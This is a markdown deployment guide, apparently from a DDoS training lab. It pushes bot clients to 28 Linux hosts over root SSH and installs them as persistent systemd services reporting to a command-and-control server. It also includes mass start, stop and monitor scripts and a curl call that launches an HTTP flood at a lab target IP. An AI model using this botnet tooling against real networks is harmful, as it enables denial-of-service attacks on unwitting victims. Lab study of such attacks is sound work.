# Phase 3: Bot Deployment Commands (28 Linux Machines)

This file contains all commands to deploy bot clients to your 28 Linux machines.

## Prerequisites
- 28 Linux machines (Ubuntu/Debian/CentOS/RHEL)
- SSH access to all machines
- C2 server running and accessible
- Project files available

## Method 1: Automated Mass Deployment (Recommended)

### Step 1: Prepare Deployment from C2 Server

```bash
# On C2 server, create deployment script
sudo tee /opt/ddos-c2/mass_deploy.sh > /dev/null << 'EOF'
#!/bin/bash

# Configuration
C2_SERVER_IP="192.168.1.100"
BOT_USER="root"  # or your SSH user
SSH_KEY="/root/.ssh/id_rsa"  # path to your SSH key

# Bot IP range (adjust as needed)
BOT_IPS=(
    "192.168.1.101" "192.168.1.102" "192.168.1.103" "192.168.1.104"
    "192.168.1.105" "192.168.1.106" "192.168.1.107" "192.168.1.108"
    "192.168.1.109" "192.168.1.110" "192.168.1.111" "192.168.1.112"
    "192.168.1.113" "192.168.1.114" "192.168.1.115" "192.168.1.116"
    "192.168.1.117" "192.168.1.118" "192.168.1.119" "192.168.1.120"
    "192.168.1.121" "192.168.1.122" "192.168.1.123" "192.168.1.124"
    "192.168.1.125" "192.168.1.126" "192.168.1.127" "192.168.1.128"
)

echo "Starting mass deployment to ${#BOT_IPS[@]} bots..."

for BOT_IP in "${BOT_IPS[@]}"; do
    echo "Deploying to $BOT_IP..."
    
    # Copy project files
    scp -i "$SSH_KEY" -r /opt/ddos-c2/* "$BOT_USER@$BOT_IP:/tmp/ddos-lab/"
    
    # Execute deployment
    ssh -i "$SSH_KEY" "$BOT_USER@$BOT_IP" "cd /tmp/ddos-lab && chmod +x deployment/deploy_bot.sh && ./deployment/deploy_bot.sh"
    
    if [ $? -eq 0 ]; then
        echo "✓ Successfully deployed to $BOT_IP"
    else
        echo "✗ Failed to deploy to $BOT_IP"
    fi
    
    sleep 2
done

echo "Mass deployment completed!"
EOF

# Make script executable
sudo chmod +x /opt/ddos-c2/mass_deploy.sh
```

### Step 2: Execute Mass Deployment

```bash
# Run mass deployment
sudo /opt/ddos-c2/mass_deploy.sh

# Monitor deployment progress
tail -f /var/log/ddos-lab/c2_server.log
```

## Method 2: Manual Deployment (Per Bot Machine)

### Step 1: Copy Files to Bot Machine

```bash
# From C2 server or your Windows machine
scp -r /opt/ddos-c2/* user@192.168.1.101:/tmp/ddos-lab/

# SSH to bot machine
ssh user@192.168.1.101
```

### Step 2: Run Deployment Script on Bot Machine

```bash
# Navigate to project directory
cd /tmp/ddos-lab

# Make deployment script executable
chmod +x deployment/deploy_bot.sh

# Run deployment (requires root)
sudo ./deployment/deploy_bot.sh
```

### Step 3: Verify Bot Deployment

```bash
# Check bot service status
sudo systemctl status ddos-bot

# Check bot logs
sudo journalctl -u ddos-bot -f

# Check if bot is connecting to C2
sudo tail -f /var/log/ddos-lab/bot_client.log
```

## Method 3: Custom Deployment Script

### Step 1: Create Custom Bot Deployment

```bash
# Create custom deployment script for each bot
sudo tee /tmp/deploy_single_bot.sh > /dev/null << 'EOF'
#!/bin/bash

# Configuration
C2_SERVER_IP="192.168.1.100"
BOT_IP="$1"
BOT_USER="root"

if [ -z "$BOT_IP" ]; then
    echo "Usage: $0 <bot_ip>"
    exit 1
fi

echo "Deploying bot to $BOT_IP..."

# Update system
ssh "$BOT_USER@$BOT_IP" "apt update && apt install -y python3 python3-pip python3-venv"

# Create bot user and directories
ssh "$BOT_USER@$BOT_IP" "
    useradd -r -s /bin/false -d /opt/ddos-bot ddos-bot || true
    mkdir -p /opt/ddos-bot /var/log/ddos-lab
    chown -R ddos-bot:ddos-bot /opt/ddos-bot /var/log/ddos-lab
"

# Copy project files
scp -r /opt/ddos-c2/* "$BOT_USER@$BOT_IP:/opt/ddos-bot/"

# Setup Python environment
ssh "$BOT_USER@$BOT_IP" "
    cd /opt/ddos-bot
    python3 -m venv venv
    venv/bin/pip install -r requirements.txt
    chown -R ddos-bot:ddos-bot /opt/ddos-bot
"

# Create bot configuration
ssh "$BOT_USER@$BOT_IP" "cat > /opt/ddos-bot/bot_config.json << 'BOTEOF'
{
  \"bot_client\": {
    \"c2_server_host\": \"$C2_SERVER_IP\",
    \"c2_server_port\": 8081,
    \"log_file\": \"/var/log/ddos-lab/bot_client.log\"
  }
}
BOTEOF"

# Create systemd service
ssh "$BOT_USER@$BOT_IP" "cat > /etc/systemd/system/ddos-bot.service << 'SERVICEEOF'
[Unit]
Description=DDoS Lab Bot Client
After=network.target

[Service]
Type=simple
User=ddos-bot
Group=ddos-bot
WorkingDirectory=/opt/ddos-bot
Environment=PYTHONPATH=/opt/ddos-bot
ExecStart=/opt/ddos-bot/venv/bin/python -m bot_client.main
Restart=always
RestartSec=10
AmbientCapabilities=CAP_NET_RAW
CapabilityBoundingSet=CAP_NET_RAW

[Install]
WantedBy=multi-user.target
SERVICEEOF"

# Enable and start service
ssh "$BOT_USER@$BOT_IP" "
    systemctl daemon-reload
    systemctl enable ddos-bot
    systemctl start ddos-bot
    systemctl status ddos-bot
"

echo "Bot deployment to $BOT_IP completed!"
EOF

chmod +x /tmp/deploy_single_bot.sh
```

### Step 2: Deploy to Individual Bots

```bash
# Deploy to each bot individually
/tmp/deploy_single_bot.sh 192.168.1.101
/tmp/deploy_single_bot.sh 192.168.1.102
# ... continue for all 28 bots
/tmp/deploy_single_bot.sh 192.168.1.128
```

## Verification Commands

### Step 1: Check Bot Connections on C2 Server

```bash
# Check connected bots via API
curl http://localhost:8080/api/bots | python3 -m json.tool

# Check bot count
curl -s http://localhost:8080/api/status | grep -o '"active_bots":[0-9]*'

# Monitor C2 logs for bot connections
sudo journalctl -u ddos-c2 -f | grep -i "bot.*connected"
```

### Step 2: Verify Individual Bot Status

```bash
# Create verification script
sudo tee /opt/ddos-c2/verify_bots.sh > /dev/null << 'EOF'
#!/bin/bash

BOT_IPS=(
    "192.168.1.101" "192.168.1.102" "192.168.1.103" "192.168.1.104"
    "192.168.1.105" "192.168.1.106" "192.168.1.107" "192.168.1.108"
    "192.168.1.109" "192.168.1.110" "192.168.1.111" "192.168.1.112"
    "192.168.1.113" "192.168.1.114" "192.168.1.115" "192.168.1.116"
    "192.168.1.117" "192.168.1.118" "192.168.1.119" "192.168.1.120"
    "192.168.1.121" "192.168.1.122" "192.168.1.123" "192.168.1.124"
    "192.168.1.125" "192.168.1.126" "192.168.1.127" "192.168.1.128"
)

echo "Verifying bot status on ${#BOT_IPS[@]} machines..."
echo "================================================"

for BOT_IP in "${BOT_IPS[@]}"; do
    echo -n "Bot $BOT_IP: "
    
    # Check if bot service is running
    if ssh root@$BOT_IP "systemctl is-active ddos-bot" &>/dev/null; then
        echo "✓ RUNNING"
    else
        echo "✗ NOT RUNNING"
    fi
done

echo "================================================"
echo "Summary:"
curl -s http://localhost:8080/api/status | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'Connected bots: {data[\"active_bots\"]}/{data[\"max_bots\"]}')
"
EOF

chmod +x /opt/ddos-c2/verify_bots.sh

# Run verification
sudo /opt/ddos-c2/verify_bots.sh
```

### Step 3: Test Bot Communication

```bash
# Send test command to all bots
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 1,
    "duration": 5
  }'

# Stop test attack
curl -X POST http://localhost:8080/api/attack/stop
```

## Troubleshooting

### Bot Not Connecting

```bash
# Check bot logs on specific machine
ssh root@192.168.1.101 "journalctl -u ddos-bot -f"

# Check network connectivity
ssh root@192.168.1.101 "ping -c 3 192.168.1.100"
ssh root@192.168.1.101 "telnet 192.168.1.100 8081"

# Restart bot service
ssh root@192.168.1.101 "systemctl restart ddos-bot"
```

### Permission Issues

```bash
# Fix bot permissions
ssh root@192.168.1.101 "
    chown -R ddos-bot:ddos-bot /opt/ddos-bot
    chown -R ddos-bot:ddos-bot /var/log/ddos-lab
    systemctl restart ddos-bot
"
```

### Service Issues

```bash
# Check service status
ssh root@192.168.1.101 "systemctl status ddos-bot -l"

# Check service logs
ssh root@192.168.1.101 "journalctl -u ddos-bot --no-pager -l"

# Restart all bot services
for i in {101..128}; do
    ssh root@192.168.1.$i "systemctl restart ddos-bot"
done
```

## Management Commands

### Start All Bots

```bash
# Create start all script
sudo tee /opt/ddos-c2/start_all_bots.sh > /dev/null << 'EOF'
#!/bin/bash
for i in {101..128}; do
    echo "Starting bot on 192.168.1.$i"
    ssh root@192.168.1.$i "systemctl start ddos-bot" &
done
wait
echo "All bots started!"
EOF

chmod +x /opt/ddos-c2/start_all_bots.sh
```

### Stop All Bots

```bash
# Create stop all script
sudo tee /opt/ddos-c2/stop_all_bots.sh > /dev/null << 'EOF'
#!/bin/bash
for i in {101..128}; do
    echo "Stopping bot on 192.168.1.$i"
    ssh root@192.168.1.$i "systemctl stop ddos-bot" &
done
wait
echo "All bots stopped!"
EOF

chmod +x /opt/ddos-c2/stop_all_bots.sh
```

### Monitor All Bots

```bash
# Create monitoring script
sudo tee /opt/ddos-c2/monitor_bots.sh > /dev/null << 'EOF'
#!/bin/bash
while true; do
    clear
    echo "=== Bot Status Monitor ==="
    echo "Time: $(date)"
    echo
    
    # Get C2 status
    curl -s http://localhost:8080/api/status | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(f'Connected bots: {data[\"active_bots\"]}/{data[\"max_bots\"]}')
    if data.get('current_attack'):
        print(f'Current attack: {data[\"current_attack\"][\"attack_type\"]} -> {data[\"current_attack\"][\"target_ip\"]}')
    else:
        print('No active attack')
except:
    print('Error getting status')
"
    
    echo
    sleep 5
done
EOF

chmod +x /opt/ddos-c2/monitor_bots.sh
```

## Next Steps

After completing this phase:
1. Verify all 28 bots are connected to C2 server
2. Test basic attack functionality
3. Proceed to Phase 4: Windows Victim Setup

## Important Notes

- All bots should appear in: `curl http://192.168.1.100:8080/api/bots`
- Bot logs location: `/var/log/ddos-lab/bot_client.log`
- Bot service name: `ddos-bot`
- Bot user: `ddos-bot`
- Bot directory: `/opt/ddos-bot`